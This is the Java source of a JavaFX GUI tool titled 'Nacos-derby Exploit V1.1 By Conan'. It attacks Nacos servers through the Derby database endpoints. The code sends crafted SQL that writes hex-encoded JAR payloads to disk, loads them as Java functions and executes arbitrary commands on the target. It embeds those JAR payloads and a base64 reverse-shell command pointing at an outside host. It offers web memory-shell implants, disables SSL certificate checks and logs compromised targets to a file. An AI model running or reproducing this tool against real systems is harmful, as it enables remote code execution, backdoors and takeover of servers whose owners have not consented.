package sample;

import javafx.application.Application;
import javafx.application.Platform;
import javafx.concurrent.Task;
import javafx.geometry.Insets;
import javafx.scene.Scene;
import javafx.scene.control.*;
import javafx.scene.layout.GridPane;
import javafx.scene.layout.HBox;
import javafx.scene.layout.VBox;
import javafx.stage.Stage;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.Random;

import javax.net.ssl.*;

public class Main extends Application {

    private TextArea outputArea;
    private TextField commandField;
    private TextField tokenField;
    private String currentId;
    private String currentExternalName;
    private String currentService;
    private String currentDerbyUrl;

    static {
        disableSslVerification();
    }

    private static void disableSslVerification() {
        try {
            TrustManager[] trustAllCerts = new TrustManager[]{
                    new X509TrustManager() {
                        public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                            return null;
                        }
                        public void checkClientTrusted(
                                java.security.cert.X509Certificate[] certs, String authType) {
                        }
                        public void checkServerTrusted(
                                java.security.cert.X509Certificate[] certs, String authType) {
                        }
                    }
            };

            SSLContext sc = SSLContext.getInstance("SSL");
            sc.init(null, trustAllCerts, new java.security.SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HostnameVerifier allHostsValid = (hostname, session) -> true;
            HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void start(Stage primaryStage) {

        primaryStage.setOnCloseRequest(event -> {
            // 关闭窗口时触发
            Platform.exit(); // 退出JavaFX应用
            System.exit(0); // 退出Java虚拟机
        });

        primaryStage.setTitle("Nacos-derby Exploit V1.1 By Conan");

        VBox mainBox = new VBox(10);
        mainBox.setPadding(new Insets(20));

        GridPane formGrid = new GridPane();
        formGrid.setVgap(10);
        formGrid.setHgap(10);

        Label targetLabel = new Label("目标 URL:");
        GridPane.setConstraints(targetLabel, 0, 0);
        TextField targetField = new TextField();
        GridPane.setConstraints(targetField, 1, 0);

        Label commandLabel = new Label("执行:");
        GridPane.setConstraints(commandLabel, 0, 1);
        commandField = new TextField();
        GridPane.setConstraints(commandField, 1, 1);

        Label serviceLabel = new Label("落地jar目录:");
        GridPane.setConstraints(serviceLabel, 0, 2);
        TextField serviceField = new TextField();
        GridPane.setConstraints(serviceField, 1, 2);

        Label tokenLabel = new Label("Access Token:");
        GridPane.setConstraints(tokenLabel, 0, 3);
        tokenField = new TextField();
        GridPane.setConstraints(tokenField, 1, 3);

        Label gParamLabel = new Label("类型:");
        GridPane.setConstraints(gParamLabel, 0, 4);
        ComboBox<String> gParamComboBox = new ComboBox<>();
        gParamComboBox.getItems().addAll("linux 反弹","冰蝎内存马", "AntSword内存马", "cmd");
        gParamComboBox.setValue("cmd"); // 默认选择 'cmd'
        GridPane.setConstraints(gParamComboBox, 1, 4);

        Button exploitButton = new Button("Exploit");
        GridPane.setConstraints(exploitButton, 1, 5);

        Button executeButton = new Button("Execute Command");
        GridPane.setConstraints(executeButton, 1, 6);

        Button cleanButton = new Button("擦屁股");
        GridPane.setConstraints(cleanButton, 1, 7);

        Button systemCheckButton = new Button("判断系统");
        GridPane.setConstraints(systemCheckButton, 1, 8);

        Label proxyLabel = new Label("代理地址:");
        GridPane.setConstraints(proxyLabel, 0, 5);
        TextField proxyField = new TextField();
        GridPane.setConstraints(proxyField, 1, 5);
        Button setProxyButton = new Button("设置代理");
        GridPane.setConstraints(setProxyButton, 2, 5);


        outputArea = new TextArea();
        outputArea.setPrefHeight(300);
        outputArea.setEditable(false);

        formGrid.getChildren().addAll(targetLabel, targetField, commandLabel, commandField,
                serviceLabel, serviceField, tokenLabel, tokenField, gParamLabel, gParamComboBox, proxyLabel, proxyField, setProxyButton);

        HBox buttonBox = new HBox(10);
        buttonBox.getChildren().addAll(exploitButton, executeButton, cleanButton, systemCheckButton);
        buttonBox.setPadding(new Insets(10, 0, 0, 0));

        mainBox.getChildren().addAll(formGrid, buttonBox, outputArea);

        Scene scene = new Scene(mainBox, 600, 600);
        primaryStage.setScene(scene);
        primaryStage.show();

        exploitButton.setOnAction(e -> {
            String target = targetField.getText();
            String command = commandField.getText();
            String service = serviceField.getText();
            String token = tokenField.getText();
            String gParam = gParamComboBox.getValue();

            Task<Void> task = new Task<Void>() {
                @Override
                protected Void call() throws Exception {
                    exploit(target, command, service, token, gParam, gParam);
                    return null;
                }
            };

            new Thread(task).start();
        });

        executeButton.setOnAction(e -> {
            String newCommand = commandField.getText();
            String token = tokenField.getText();
            if (currentId != null && currentExternalName != null && currentService != null && newCommand != null && currentDerbyUrl != null) {
                Task<Void> task = new Task<Void>() {
                    @Override
                    protected Void call() throws Exception {
                        executeCommand(newCommand, token);
                        return null;
                    }
                };

                new Thread(task).start();
            } else {
                Platform.runLater(() -> outputArea.appendText("Please run the initial exploit first.\n"));
            }
        });

        cleanButton.setOnAction(e -> outputArea.appendText("先自己擦吧 "  + "\n"));
        systemCheckButton.setOnAction(e -> {
            String target = targetField.getText();
            String token = tokenField.getText();

            Task<Void> task = new Task<Void>() {
                @Override
                protected Void call() throws Exception {
                    checkSystem(target, token);
                    return null;
                }
            };

            new Thread(task).start();
        });

        //设置代理
        setProxyButton.setOnAction(e -> {
            String proxyAddress = proxyField.getText();
            if (proxyAddress != null && !proxyAddress.isEmpty()) {
                if (proxyAddress.startsWith("http://")) {
                    proxyAddress = proxyAddress.substring(7); // 去掉 http://
                }
                String[] proxyParts = proxyAddress.split(":");
                if (proxyParts.length == 2) {
                    String proxyHost = proxyParts[0];
                    String proxyPort = proxyParts[1];

                    System.setProperty("http.proxyHost", proxyHost);
                    System.setProperty("http.proxyPort", proxyPort);
                    System.setProperty("https.proxyHost", proxyHost);
                    System.setProperty("https.proxyPort", proxyPort);

                    String finalProxyAddress = proxyAddress;
                    Platform.runLater(() -> outputArea.appendText("代理已设置: " + finalProxyAddress + "\n"));
                } else {
                    Platform.runLater(() -> outputArea.appendText("代理地址格式不正确，正确格式应为: http://127.0.0.1:8080\n"));
                }
            } else {
                Platform.runLater(() -> outputArea.appendText("请输入代理地址\n"));
            }
        });

        // 根据选择的执行类型设置 Execute Command 按钮的可用性
        gParamComboBox.setOnAction(event -> {
            String selectedValue = gParamComboBox.getValue();
            if ("cmd".equals(selectedValue)) {
                commandField.setPromptText("命令");
                executeButton.setDisable(false);
            } else {
                executeButton.setDisable(true);
                updateCommandFieldPrompt(selectedValue);
            }
        });
    }

    //擦
    private void checkSystem(String target, String token) {
        try {
            String checkUrl = new URL(new URL(target), "/nacos/v1/cs/ops/data/removal").toString();
            HttpURLConnection connection = (HttpURLConnection) new URL(checkUrl).openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundarymeBFzDXo");
            connection.setRequestProperty("User-Agent", "Nacos-Server");

            if (token != null && !token.isEmpty()) {
                connection.setRequestProperty("accessToken", token);
            }

            connection.setDoOutput(true);
            String boundary = "----WebKitFormBoundarymeBFzDXo";
            String postData = "--" + boundary + "\r\n" +
                    "Content-Disposition: form-data; name=\"file\"; filename=\"file\"\r\n" +
                    "Content-Type: text/plain\r\n\r\n" +
                    "xxxx\r\n" +
                    "--" + boundary + "--\r\n";

            try (OutputStream os = connection.getOutputStream()) {
                os.write(postData.getBytes(StandardCharsets.UTF_8));
            }

            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                String response = getResponseString(connection);
                //判断有没有漏洞  File '
                String systemfile = response.contains("File '") ? "存在漏洞" : "不存在漏洞，响应: " + response ;
                Platform.runLater(() -> outputArea.appendText( systemfile + "\n"));
                if (systemfile=="存在漏洞"){
                    // 判断系统类型
                    String systemType = response.contains(":\\") ? "Windows(建议落地 c:/windows/temp)" : "Linux(建议落地 /tmp)";
                    Platform.runLater(() -> outputArea.appendText("目标系统类型为: " + systemType + "\n"));
                }

            } else {
                Platform.runLater(() -> outputArea.appendText("未能成功获取系统信息，响应代码: " + responseCode + "\n"));
            }
        } catch (Exception e) {
            e.printStackTrace();
            Platform.runLater(() -> outputArea.appendText("Error: " + e.getMessage() + "\n"));
        }
    }

    private void updateCommandFieldPrompt(String gParam) {
        switch (gParam) {
            case "linux 反弹":
                commandField.setPromptText("YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzUzIDA+JjE=");
                outputArea.appendText("本来是远程打写的功能，保存下来了，在执行处填入反弹的base编码即可\n");
                break;
            case "冰蝎内存马":
                commandField.setPromptText("注入内存马");
                break;
            case "AntSword内存马":
                commandField.setPromptText("注入内存马");
                break;
            case "cmd":
            default:
                commandField.setPromptText("Enter command to execute");
                break;
        }
    }

    private void exploit(String target, String command, String service, String token, String gParam, String ghex) {
        try {
            Random random = new Random();
            String externalName = getExternalName(gParam);
            String removalUrl = new URL(new URL(target), "/nacos/v1/cs/ops/data/removal").toString();
            String derbyUrl = new URL(new URL(target), "/nacos/v1/cs/ops/derby").toString();

            Platform.runLater(() -> outputArea.appendText("当前选择执行类型为>>> " + gParam + "\n开始部署...\n"));

            for (int i = 0; i < Integer.MAX_VALUE; i++) {
                String id = getRandomId();
                String jarHex = getjarhex(ghex);  // 获取 jar 的十六进制表示
                String randomFilename = getRandomId() + ".jar";

                // 从落地jar目录获取/tmp/的路径
                String tmpPath = service.endsWith("/") ? service + randomFilename : service + "/" + randomFilename;

                String postSql = String.format("CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE('values cast(X''%s'' as blob)', '%s', ',', '\"', 'UTF-8', '%s')\n" +
                                "CALL SQLJ.INSTALL_JAR('%s', 'NACOS.%s', 0)\n" +
                                "CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'NACOS.%s')\n" +
                                "CREATE FUNCTION S_EXAMPLE_%s(PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME '%s'",
                        jarHex, tmpPath, tmpPath, tmpPath, id, id, id, externalName);

                HttpURLConnection postConnection = (HttpURLConnection) new URL(removalUrl).openConnection();
                postConnection.setDoOutput(true);
                postConnection.setRequestMethod("POST");
                String boundary = "----WebKitFormBoundary" + getRandomId();
                postConnection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                postConnection.setRequestProperty("User-Agent", "Nacos-Server");

                if (token != null && !token.isEmpty()) {
                    postConnection.setRequestProperty("accessToken", token);
                }

                String postBody = "--" + boundary + "\r\n" +
                        "Content-Disposition: form-data; name=\"file\"; filename=\"file\"\r\n" +
                        "Content-Type: text/plain\r\n\r\n" +
                        postSql + "\r\n--" + boundary + "--\r\n";
                try (OutputStream os = postConnection.getOutputStream()) {
                    os.write(postBody.getBytes(StandardCharsets.UTF_8));
                }

                int postResponseCode = postConnection.getResponseCode();
                if (postResponseCode == HttpURLConnection.HTTP_OK) {
                    String postResponseString = getResponseString(postConnection);

                    if (postResponseString.contains("\"code\":200") && postResponseString.contains("\"message\":null") && postResponseString.contains("\"data\":")) {
                        Platform.runLater(() -> outputArea.appendText("部署成功得到 函数id >>> " + id + "\n"));
                        // 记录部署成功信息到文件
                        recordDeployment(target, id, gParam);
                        currentId = id;
                        currentExternalName = externalName;
                        currentService = service;
                        currentDerbyUrl = derbyUrl;

                        executeCommand(command, token);
                        break;
                    } else {
                        // Ignore failed attempts
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            Platform.runLater(() -> outputArea.appendText("Error: " + e.getMessage() + "\n"));
        }
    }
    private void recordDeployment(String target, String id, String gParam) {
        String filename = "NacosShell.txt";
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(filename, true))) {
            String deploymentInfo = target + "----" + id + "----" + gParam + "\n";
            writer.write(deploymentInfo);
            writer.flush();
        } catch (IOException e) {
            e.printStackTrace();
            Platform.runLater(() -> outputArea.appendText("Error writing deployment info to file: " + e.getMessage() + "\n"));
        }
    }

    private void executeCommand(String command, String token) {
        try {
            String getSql = "select * from (select count(*) as b, S_EXAMPLE_" + currentId + "('" + command + "') as a from config_info) tmp /*ROWS FETCH NEXT*/";

            HttpURLConnection getConnection = (HttpURLConnection) new URL(currentDerbyUrl + "?sql=" + URLEncoder.encode(getSql, "UTF-8")).openConnection();
            getConnection.setRequestMethod("GET");
            getConnection.setRequestProperty("User-Agent", "Nacos-Server");


            if (token != null && !token.isEmpty()) {
                getConnection.setRequestProperty("accessToken", token);
            }

            int getResponseCode = getConnection.getResponseCode();
            if (getResponseCode == HttpURLConnection.HTTP_OK) {
                String getResponseString = getResponseString(getConnection);
                Platform.runLater(() -> outputArea.appendText("执行命令 " + command + " >>> " + getResponseString + "\n"));
            }
        } catch (Exception e) {
            e.printStackTrace();
            Platform.runLater(() -> outputArea.appendText("Error: " + e.getMessage() + "\n"));
        }
    }

    private String getRandomId() {
        String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        StringBuilder id = new StringBuilder();
        Random random = new Random();
        for (int i = 0; i < 8; i++) {
            id.append(characters.charAt(random.nextInt(characters.length())));
        }
        return id.toString();
    }

    private String getExternalName(String gParam) {
        switch (gParam) {
            case "linux 反弹":
                return "ft.poc.Example.exec";
            case "冰蝎内存马":
                return "org.apachegv.SignatureUtils.exec";
            case "AntSword内存马":
                return "TomcatMemoryShell.ConfigurationUtil.exec";
            case "cmd":
            default:
                return "test.poc.Example.exec";
        }
    }

    private String getjarhex(String ghex) {
        switch (ghex) {
            case "linux 反弹":
                return "504b03041400080808007644f158000000000000000000000000140004004d4554412d494e462f4d414e49464553542e4d46feca0000f34dcccb4c4b2d2ed10d4b2d2acecccfb35230d433e0e5f24dccccd375ce492c2eb65228014aeb15e427ebb95624e616e4a4f272f1720100504b07087f64045e3800000037000000504b03040a00000800007644f158000000000000000000000000090000004d4554412d494e462f504b03040a00000800007644f1580000000000000000000000000300000066742f504b03040a00000800007644f1580000000000000000000000000700000066742f706f632f504b03041400080808007644f1580000000000000000000000001400000066742f706f632f4578616d706c652e636c6173738d55db7313551cfeb64d72d2655b20bd868bb420104a425101315414b0606b7ab137aca8b8d96c9a85241b371b2816c40b8af7ebb333be307d451f52c6cef8e8837f857f81cf3e59bf934dd376ba8e6426e7ecf95dbedff5fcce1ffffcfa1b8013f841c541cc8431abe2495c6ec16b9853f13aae08bca12224396faa780b5705de56a1cab32ef7741886dc339269aac8625e20a722024be09a8a0e5c974b5e6214048a02b68a2866044a2a76e31d153d7024a52c8f6501378c8a3c67a44646e086c04d05a141ab68b9671534c78ecc2a085cb033a682ed29ab688e550a69d399d6d379522229dbd0f3b3ba63c9739d1870735659c18e54d61d28d9c6c0d0825e28e5cd33e41474aba8a02b7625754dbfa10fe4f5e2fcc094eb58c5f933353bba334fcd761f365d714c575af46105cc05d3507028e603eb272f8c9cee94259c52a2b90d22138e6d98e5b234979541747a3ccb1e182e962a2e114cbd20b956d951b0db8f3b69ea19d3a14c539a223d0d91f3956cd674cc4c831fc8339dccf54dc7724d8a7635443d472fd7e8d2dd128f359175772624a921a1980d5e2d8ca105c32cb9965d94ae1a858c7426db706643323ca728d53ae5eac6f551bd542ba2c0021b51e096c0bbec2fb696d74b6c23b68c0275caae388679d192f5d6ea053e26c1351cc2611954ced60b96866770426051c36ddc11784fc35dbccf48fddd5010acb8d9c469810f347c888f14746f15b4f21929d996d6cbb9de84d1bb681a393baee11e3ea6fc9ddb8b6498a74ec41319ef3b174f5877347c82fbd2994f199386cff0b982e87fd64ec6f0c59a975b2a27b95f6af84a02dec3d7ec1f9fbc2be8f02be69af0e6024ac46f347c8bef347c2fb3d7101a1edf80181a9a9c1c9f4c32f6cd178b576ddd83f1f435d37037913c0714ecdcd2e61b2dad2761b3f2adb26b92d46c57dc2dfdd7b80eed3ee4b5becdd3f54ebf9b39bbc9a5c94ad1b50a0c469d37ddc6a133b6f102d7c93418d24b25b3c8be4e3cd69dafb70d15c3aebd968f8e98ef7038fc3f88eb23a28d9e6eca5bf71ae29679d11ff365f867a57d5db83e2c24354c8d4caa3632e28f1974fd6e6fc0ab4f0c89b7bde4d58ad77edad10dc2f6c47cc78b140e1a79bb6ca28f8fd541c85f331479d3b9c6781ae0ae700ff62f43f9991f4d38c235e411d1cf55ab7f1f459c7b0b123856571ea17413f7b648d32334a77e41e06815c17594361a0304d1c268a5a644ebf23468f878cd4e184fe169e2b5c881e3e12a7f22403af06005a1b9658854243cfa082d2b5079da16d1aa68ede73fd2c6a58aed55ec184b54b133195841642e1a882fa33d195c41c75c34b88cce6448498a68a88aaeb9a4f81dad47a3a28aeecb4bab7f2de1dce80aa204dd35b682dd738965ec4906e2d140157b09f884fcd8b784a004f34cf7d12239fb3dc30f19ee81870c288cab48f3815ee45cb98f5e862dc31f437b2d7d6186bb8d0f7d3fdff7e3e8c420937009dd4c5f0f66f8825fc5016aef82c187fd3af6a082bd44dac789db4bbc3e0ebdfdf889f593e92b11691ba67192496b22e5244ee159da3bce849ec6734cdc20d19238c3825d22fe209e67924768f52c3504f14fe205bc488d0a0b7a0ee7a96150e6025eaa15e601862807fafc232e1241c1cb3c8d23b44a90b0c0b0c0486d7d452025302a30c623b0cad89a3c36705e607c950e07d7e4c70526045e852230a9fccdf0154cd5ba64fa5f504b0708b54816f5d204000057090000504b010214001400080808007644f1587f64045e38000000370000001400040000000000000000000000000000004d4554412d494e462f4d414e49464553542e4d46feca0000504b01020a000a00000800007644f15800000000000000000000000009000000000000000000000000007e0000004d4554412d494e462f504b01020a000a00000800007644f1580000000000000000000000000300000000000000000000000000a500000066742f504b01020a000a00000800007644f1580000000000000000000000000700000000000000000000000000c600000066742f706f632f504b010214001400080808007644f158b54816f5d2040000570900001400000000000000000000000000eb00000066742f706f632f4578616d706c652e636c617373504b0506000000000500050025010000ff0500000000";
            case "冰蝎内存马":
                return  "";
            case "AntSword内存马":
                return "";
            case "cmd":
            default:
                return "504b0304140008080800f888ec58000000000000000000000000140004004d4554412d494e462f4d414e49464553542e4d46feca0000f34dcccb4c4b2d2ed10d4b2d2acecccfb35230d433e0e5e2e50200504b0708b27f02ee1b00000019000000504b030414000808080041a477530000000000000000000000000a0000002e636c61737370617468758fcb0ac2301045d7fa15257ba7ba73d12822151454d0ea566232b4d138297914fd7b2d288ad0ddcc70ee706e36bddf4cd2a0f3da12672318b204495aa5a9e4ec502c0663369df4336984f7b508d5a4dffb2e48c13d92ab26c599b4c492f6c8997525a034baf6081715c08848b27a7d84d52e3fcdb79b62b6dce4bbf49fd314d09130a0f01c4b88fa9d4407fb204809a78eebe25163ba128dd8e783118c59da69e49dfc18b563376863a863f8b0674d2d9ba53f9d9f504b07089cd2c70cb600000027010000504b030414000808080041a47753000000000000000000000000080000002e70726f6a6563747590410ec2201444d7f6140d7b41772e285d68bc807a00849f86a60502b4f1f842c1c69ab89b19e6ff07d0f6350ef50cce2ba31b74c407548316462add35e871bfee4fa86515b5cef420c205bc70ca865866d58e6a3e020be003b64650b2d8180b338ea003a3e4a3625836f8a4c9b7794e6a90370b229ae2ce718c6b99820231aec32006653de05e062c8c8b82cf7ce9835be17180bb6e4a549f2dd9784a7e0825281788b43039c8d5acffb3f379422fbdb46b1d5fdfb8f9b237504b0708fc3d8721ba0000006f010000504b0304140008080800f488ec5800000000000000000000000016000000746573742f706f632f4578616d706c652e636c6173738d556b731355187e4e73399b746921504a00b9782969691b44504cb02a50b418526cb13554d16db2095b926cdc6ca015efe2fd7e9df19b337e808fe88794b1337ed419ff8d7fc0fa9c4dd20b0d23ed4cced9f3beeff3bcd773fefef7f73f001cc18f121d029b5db3eac62b76363e3a6f942a4553c2cfd339e38a112f1ae5427c7c76ceccba02c1e356d97247047cb1fe2901ff493b6786e1434847004181ee945536d3b5d2ace99c37668ba6402465678de294e158eabb79e8772f595525bb93374959c9b0ca02db6333a955fe49d7b1ca8564ff94862d029a55c9dae5bc55084360ab8e6de8a19d396f6605fa626dcc361e85d08ba8c48e75514e2e545db3a46327763142bbc6807b1aa6961d3f473b97d6a6514a86711ff64aec217b1bb18e7dd82f202beaa8c8587adaf9a4d2673805a6616b9b48c9ef98ae4ad10691c401a6e7cee313b57cde74c2e84348c38040a0e6e6878e6918a4237675b86c9458a85e0ceb88ab6c75164cf79c63574cc75dd0f03095a6ad72cebe5a0de3111c9538b23e311e858e47f19840b8ea1a8e5b9db6dc4b7709ed8286c7194061f67218493c21715c60cbaada44adec5a2553c7089e241c3d699e28b8b5b56a1e2715cad3aacc27040efc4f7d1954d6ac5669730aa72546d73137853a9ec1b3025d641e2b576acdb209f4b6d859cf350266fc8c40b48d64c234722ae96348a901382b30106b8bd0aefe12e3ad3a52bb513f33d7824ce3790539c1f658856c0869abea7c5ec70b6017058d4ac52ce70406efa9f51b4449c5f0a28e0c2e709ee8634e4daec0b6589b619178899296138dc369c772959f330849bc72e720b4a41761a82866d745d1107a51e49097305bd61ee7e87cd6acb8965dd651003bacbbd2982c237bf9bc6364a9bc23966a43e6e1cd604ec765751305b245bb6a2a0fe6243883bd1bf36015994c0d15a6707462627c221146098ef277bf427275d4bcecb876c34289afaaa4cf0b0cdd63ae3d8ea4b27455cd5c8937d6e46a6c7c255ace4bb6c4220abab3b54d3f0b74cce619fbddeac909ce5e329caaba348276356da871f2e5d535dbd3b62529b5aa8ec0ae76d266a329526785744397aadbbae8b58d305768d617912ac1ab5e7dd8eba9762d946cdd944aa5a76d65053679f53f6b54bc0744e2bbb5495c3bc2e149bbe664cdd3967a66f4e6ab32ac54b19f8f850feacfc71d9f2bfe4a7ec5b90aae81814568bf72d381307f83de6127ff01bda1c07513d710bad0dd343e43ed0eae5d91cdb77959ff86ed07ebd8bd8ad2e5517611ad9bb65b3cb4ed0d0bdc8f073c1e0d0fe221e285d443d6c0ede8879fdfc0cd25f46516113b1be94f470edec650c21ff5ff89cd517fe4501d877f4230722c7d1b89813a9e4a91fa6422b084b14c3430b488e712c125a433d1e022ce25a4486837101e8c6a754c4e47651dd39984f6d7f23f377022bd841992bc9cf02fe16226ea5fc4ab89c05034504736eaafc352bbe20d04145e2913b117f19a3aafd671a58e855b8375bc7e8b31693038d039bc8d4ff039ae317295810b8c178c4be3ebd3891d8820ca52ec64ccbb31c877f430f6f021d8cb3b741f52948c332f535c0d6a98cc4b9963b3800344edc7750c10fb20bec4307ec1212f9bd7bd9adcc49bd405118fe12dea0aca03cd9d869ff10edea5879d447e8f7a3e7a318ef7b9f3933f4e8c0fa83dc27a7c888f589131faf93199243deac1a7d4d3e8cb083e635c3e7a74145fd0073ffd1ac057f89ab6df90bb06b94ca703924fa8441f17b5c3329542dec7a99553896f25c624d29e46709931f89a661012b965061c5cc1c949cc48de64945c13cbec12df0a1c6905bef7daed87ff00504b07080f80d8062a050000d5090000504b01021400140008080800f888ec58b27f02ee1b000000190000001400040000000000000000000000000000004d4554412d494e462f4d414e49464553542e4d46feca0000504b0102140014000808080041a477539cd2c70cb6000000270100000a00000000000000000000000000610000002e636c61737370617468504b0102140014000808080041a47753fc3d8721ba0000006f01000008000000000000000000000000004f0100002e70726f6a656374504b01021400140008080800f488ec580f80d8062a050000d509000016000000000000000000000000003f020000746573742f706f632f4578616d706c652e636c617373504b05060000000004000400f8000000ad0700000000";
        }
    }

    private String getResponseString(HttpURLConnection connection) throws IOException {
        try (BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            return response.toString();
        }
    }

    public static void main(String[] args) {
        launch(args);
    }
}
